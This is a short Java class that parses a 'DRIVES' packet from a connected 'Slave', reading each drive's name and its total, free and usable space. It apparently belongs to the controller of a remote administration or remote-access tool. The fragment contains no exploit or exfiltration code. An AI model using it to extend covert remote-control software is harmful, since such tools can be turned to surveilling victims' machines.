package com.redpois0n.packets;

import com.redpois0n.Drive;
import com.redpois0n.Slave;

public class PacketDRIVES extends Packet {

	@Override
	public void read(Slave slave, String line) throws Exception {
		int len = slave.readInt();
		
		slave.setDrives(new Drive[len]);
		
		for (int i = 0; i < len; i++) {
			Drive drive = new Drive();
			drive.setName(slave.readLine());
			drive.setTotalSpace((short) slave.readInt());
			drive.setFreeSpace((short) slave.readInt());
			drive.setUsableSpace((short) slave.readInt());
			slave.getDrives()[i] = drive;
		}
	}

}
